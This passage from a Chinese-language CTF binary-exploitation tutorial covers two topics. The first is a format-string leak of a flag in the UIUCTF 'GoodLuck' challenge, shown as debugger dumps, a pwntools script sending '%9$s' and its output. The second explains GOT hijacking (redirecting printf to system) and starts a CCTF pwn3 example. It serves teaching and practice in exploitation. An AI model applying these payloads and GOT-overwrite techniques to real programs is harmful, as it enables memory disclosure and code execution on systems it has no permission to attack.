</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f61</span><span class="o">:</span>	<span class="n">nop</span>    <span class="n">WORD</span> <span class="n">PTR</span> <span class="nl">cs</span><span class="p">:[</span><span class="n">rax</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f6b</span><span class="o">:</span>	<span class="n">nop</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">=&gt;</span> <span class="mh">0x7ffff7a46f70</span> <span class="o">&lt;</span><span class="n">__printf</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0xd8</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f77</span> <span class="o">&lt;</span><span class="n">__printf</span><span class="o">+</span><span class="mi">7</span><span class="o">&gt;:</span>	<span class="n">test</span>   <span class="n">al</span><span class="p">,</span><span class="n">al</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f79</span> <span class="o">&lt;</span><span class="n">__printf</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x28</span><span class="p">],</span><span class="n">rsi</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f7e</span> <span class="o">&lt;</span><span class="n">__printf</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x30</span><span class="p">],</span><span class="n">rdx</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f83</span> <span class="o">&lt;</span><span class="n">__printf</span><span class="o">+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x38</span><span class="p">],</span><span class="n">rcx</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">------------------------------------</span><span class="n">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="mo">0000</span><span class="o">|</span> <span class="mh">0x7fffffffdef8</span> <span class="o">--&gt;</span> <span class="mh">0x400890</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">234</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0x4009b8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mo">000</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0x7fffffffdf00</span> <span class="o">--&gt;</span> <span class="mh">0x31000001</span> 
</span></span><span class="line"><span class="cl"><span class="mo">0016</span><span class="o">|</span> <span class="mh">0x7fffffffdf08</span> <span class="o">--&gt;</span> <span class="mh">0x602cb0</span> <span class="p">(</span><span class="s">&#34;12345678&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mo">0024</span><span class="o">|</span> <span class="mh">0x7fffffffdf10</span> <span class="o">--&gt;</span> <span class="mh">0x602260</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
</span></span><span class="line"><span class="cl"><span class="mo">0032</span><span class="o">|</span> <span class="mh">0x7fffffffdf18</span> <span class="o">--&gt;</span> <span class="mh">0x7fffffffdf20</span> <span class="p">(</span><span class="s">&#34;flag{&#34;</span><span class="p">,</span> <span class="sc">&#39;1&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">17</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mo">0040</span><span class="o">|</span> <span class="mh">0x7fffffffdf20</span> <span class="p">(</span><span class="s">&#34;flag{&#34;</span><span class="p">,</span> <span class="sc">&#39;1&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">17</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mo">004</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0x7fffffffdf28</span> <span class="p">(</span><span class="sc">&#39;1&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">14</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mo">0056</span><span class="o">|</span> <span class="mh">0x7fffffffdf30</span> <span class="o">--&gt;</span> <span class="mh">0x313131313131</span> <span class="p">(</span><span class="err">&#39;</span><span class="mi">111111</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">------------------------------------------------------------------------------</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">Legend</span><span class="p">:</span> <span class="n">code</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">rodata</span><span class="p">,</span> <span class="n">value</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="nf">__printf</span> <span class="p">(</span><span class="n">format</span><span class="o">=</span><span class="mh">0x602cb0</span> <span class="s">&#34;12345678&#34;</span><span class="p">)</span> <span class="n">at</span> <span class="n">printf</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">28</span>
</span></span><span class="line"><span class="cl"><span class="mi">28</span>	<span class="n">printf</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="n">or</span> <span class="n">directory</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="nl">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"> <span class="n">RAX</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">RBX</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">RCX</span>  <span class="mh">0x7ffff7af2224</span> <span class="p">(</span><span class="n">write</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">cmp</span>    <span class="n">rax</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x1000</span> <span class="cm">/* &#39;H=&#39; */</span>
</span></span><span class="line"><span class="cl"> <span class="n">RDX</span>  <span class="mh">0x7ffff7dcf8c0</span> <span class="p">(</span><span class="n">_IO_stdfile_1_lock</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">RDI</span>  <span class="mh">0x602cb0</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="mi">12345678</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"> <span class="n">RSI</span>  <span class="mh">0x602490</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">You</span> <span class="nl">answered</span><span class="p">:</span><span class="err">\</span><span class="n">ng</span><span class="err">\</span><span class="n">n111111</span><span class="p">}</span><span class="err">\</span><span class="n">n</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"> <span class="n">R8</span>   <span class="mh">0x7ffff7fdc500</span> <span class="err">◂—</span> <span class="mh">0x7ffff7fdc500</span>
</span></span><span class="line"><span class="cl"> <span class="n">R9</span>   <span class="mh">0x7ffff7b50a60</span> <span class="p">(</span><span class="n">__memcpy_ssse3</span><span class="o">+</span><span class="mi">9168</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsi</span> <span class="o">-</span> <span class="mh">0xd</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="n">R10</span>  <span class="mh">0x3</span>
</span></span><span class="line"><span class="cl"> <span class="n">R11</span>  <span class="mh">0x7ffff7a46f70</span> <span class="p">(</span><span class="n">printf</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span> <span class="mh">0xd8</span>
</span></span><span class="line"><span class="cl"> <span class="n">R12</span>  <span class="mh">0x4006b0</span> <span class="p">(</span><span class="n">_start</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">xor</span>    <span class="n">ebp</span><span class="p">,</span> <span class="n">ebp</span>
</span></span><span class="line"><span class="cl"> <span class="n">R13</span>  <span class="mh">0x7fffffffe020</span> <span class="err">◂—</span> <span class="mh">0x1</span>
</span></span><span class="line"><span class="cl"> <span class="n">R14</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">R15</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">RBP</span>  <span class="mh">0x7fffffffdf40</span> <span class="err">—▸</span> <span class="mh">0x400900</span> <span class="p">(</span><span class="n">__libc_csu_init</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">r15</span>
</span></span><span class="line"><span class="cl"> <span class="n">RSP</span>  <span class="mh">0x7fffffffdef8</span> <span class="err">—▸</span> <span class="mh">0x400890</span> <span class="p">(</span><span class="n">main</span><span class="o">+</span><span class="mi">234</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span> <span class="mh">0x4009b8</span>
</span></span><span class="line"><span class="cl"> <span class="n">RIP</span>  <span class="mh">0x7ffff7a46f70</span> <span class="p">(</span><span class="n">printf</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span> <span class="mh">0xd8</span>
</span></span><span class="line"><span class="cl"><span class="err">───────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">DISASM</span> <span class="p">]</span><span class="err">───────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"> <span class="err">►</span> <span class="mh">0x7ffff7a46f70</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">&gt;</span>        <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span> <span class="mh">0xd8</span>
</span></span><span class="line"><span class="cl">    <span class="err">↓</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f79</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;</span>      <span class="n">mov</span>    <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsp</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">],</span> <span class="n">rsi</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f7e</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsp</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">],</span> <span class="n">rdx</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f83</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">+</span><span class="mi">19</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsp</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">],</span> <span class="n">rcx</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f88</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsp</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">],</span> <span class="n">r8</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f8d</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsp</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">],</span> <span class="n">r9</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46f92</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">+</span><span class="mi">34</span><span class="o">&gt;</span>     <span class="n">je</span>     <span class="n">printf</span><span class="o">+</span><span class="mi">91</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">+</span><span class="mi">91</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="err">↓</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46fcb</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">+</span><span class="mi">91</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="nl">fs</span><span class="p">:[</span><span class="mh">0x28</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46fd4</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsp</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">],</span> <span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46fd9</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">+</span><span class="mi">105</span><span class="o">&gt;</span>    <span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x7ffff7a46fdb</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">+</span><span class="mi">107</span><span class="o">&gt;</span>    <span class="n">lea</span>    <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rsp</span> <span class="o">+</span> <span class="mh">0xe0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">───────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">rsp</span>  <span class="mh">0x7fffffffdef8</span> <span class="err">—▸</span> <span class="mh">0x400890</span> <span class="p">(</span><span class="n">main</span><span class="o">+</span><span class="mi">234</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span> <span class="mh">0x4009b8</span>
</span></span><span class="line"><span class="cl"><span class="mo">01</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span>      <span class="mh">0x7fffffffdf00</span> <span class="err">◂—</span> <span class="mh">0x31000001</span>
</span></span><span class="line"><span class="cl"><span class="mo">02</span><span class="o">:</span><span class="mo">0010</span><span class="err">│</span>      <span class="mh">0x7fffffffdf08</span> <span class="err">—▸</span> <span class="mh">0x602cb0</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="mi">12345678</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="mo">03</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span>      <span class="mh">0x7fffffffdf10</span> <span class="err">—▸</span> <span class="mh">0x602260</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mo">04</span><span class="o">:</span><span class="mo">0020</span><span class="err">│</span>      <span class="mh">0x7fffffffdf18</span> <span class="err">—▸</span> <span class="mh">0x7fffffffdf20</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">flag</span><span class="p">{</span><span class="mi">11111111111111111</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="mo">05</span><span class="o">:</span><span class="mo">002</span><span class="mi">8</span><span class="err">│</span>      <span class="mh">0x7fffffffdf20</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">flag</span><span class="p">{</span><span class="mi">11111111111111111</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="mo">06</span><span class="o">:</span><span class="mo">0030</span><span class="err">│</span>      <span class="mh">0x7fffffffdf28</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="mi">11111111111111</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="mo">07</span><span class="o">:</span><span class="mo">003</span><span class="mi">8</span><span class="err">│</span>      <span class="mh">0x7fffffffdf30</span> <span class="err">◂—</span> <span class="mh">0x313131313131</span> <span class="cm">/* &#39;111111&#39; */</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">BACKTRACE</span> <span class="p">]</span><span class="err">──────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"> <span class="err">►</span> <span class="n">f</span> <span class="mi">0</span>     <span class="mf">7ff</span><span class="n">ff7a46f70</span> <span class="n">printf</span>
</span></span><span class="line"><span class="cl">   <span class="n">f</span> <span class="mi">1</span>           <span class="mi">400890</span> <span class="n">main</span><span class="o">+</span><span class="mi">234</span>
</span></span><span class="line"><span class="cl">   <span class="n">f</span> <span class="mi">2</span>     <span class="mf">7ff</span><span class="n">ff7a03bf7</span> <span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">231</span>
</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></span></span></code></pre></div><p>可以看到flag在栈上偏移为4， x64 前 6 个参数存在寄存器上面，而第一个参数又是格式化字符串</p>
<p>所以是第9个参数，payload ：%9$s</p>
<p>Exp：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1">##context.log_level = &#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">goodluck</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./goodluck&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./goodluck&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;%9$s&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl"><span class="c1">##gdb.attach(sh)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">hacker</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="err">$</span> <span class="n">python</span> <span class="n">exp</span><span class="p">.</span><span class="n">py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hacker</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">2017</span><span class="o">-</span><span class="n">UIUCTF</span><span class="o">-</span><span class="n">pwn200</span><span class="o">-</span><span class="n">GoodLuck</span><span class="o">/</span><span class="n">goodluck</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="nf">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">local</span> <span class="n">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="o">/</span><span class="n">goodluck</span><span class="err">&#39;</span><span class="o">:</span> <span class="n">pid</span> <span class="mi">15774</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="mi">9</span><span class="err">$</span><span class="n">s</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Process</span> <span class="err">&#39;</span><span class="p">.</span><span class="o">/</span><span class="n">goodluck</span><span class="err">&#39;</span> <span class="n">stopped</span> <span class="n">with</span> <span class="n">exit</span> <span class="n">code</span> <span class="mi">0</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">15774</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">what</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">the</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl"><span class="n">You</span> <span class="nl">answered</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="p">{</span><span class="mi">111111111111111</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">But</span> <span class="n">that</span> <span class="n">was</span> <span class="n">totally</span> <span class="n">wrong</span> <span class="n">lol</span> <span class="n">get</span> <span class="n">rekt</span></span></span></code></pre></div><h3 id="hijack-got" class="heading-element"><span>hijack GOT</span>
  <a href="#hijack-got" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="原理-1" class="heading-element"><span>原理</span>
  <a href="#%e5%8e%9f%e7%90%86-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>目前的 ELF 编译系统使用一种成为延迟绑定( lazy binding )的技术来实现对共享库中函数的调用过程。该机制主要通过两个数据结构 GOT 和 过程链接表( Procedure Linkage Table , PLT )实现。其简化的原理为 : 当目标模块存在一个外部共享库的函数调用时，其在汇编层面使用 call 指令实现调用，其作用为跳转至对应函数的 PLT 表项处执行，该表项的第一条指令为 jmp *[ 对应 GOT 项的地址 ]，第一次执行函数调用时，通过 GOT 与 PLT 的合作，会将最终调用函数的地址确定下来，并存放在其对应的 GOT 表项中。当后续再发生调用时， jmp *[ 对应 GOT 项的地址 ] 指令即表示直接跳转至目标函数处执行。</p>
<p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有开启 RELRO 保护时，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p>
<p>假设我们需要将函数A的地址覆盖为函数B的地址，那么步骤如下：</p>
<ol>
<li>
<p>确定函数A的GOT表地址</p>
</li>
<li>
<p>确定函数B的地址</p>
<p>在这一步，需要我们自己想办法来泄露对应函数 B 的地址。</p>
</li>
<li>
<p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p>
<p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p>
<ul>
<li>使用write函数</li>
</ul>
<pre tabindex="0"><code>pop eax; ret;           # printf@got -&gt; eax
pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx
add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre><ul>
<li>格式化字符串任意地址写</li>
</ul>
</li>
</ol>
<h4 id="例子-1" class="heading-element"><span>例子</span>
  <a href="#%e4%be%8b%e5%ad%90-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>使用的是2016 CCTF中的pwn3</p>
<p>首先查看保护</p>
<pre tabindex="0"><code>hacker@ubuntu:~/Desktop/2016-CCTF-pwn3$ checksec pwn3
[*] &#39;/home/hacker/Desktop/2016-CCTF-pwn3/pwn3&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><p>开了NX。</p>
<p>main()：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s1</span><span class="p">;</span> <span class="c1">// [esp+14h] [ebp-2Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+3Ch] [ebp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
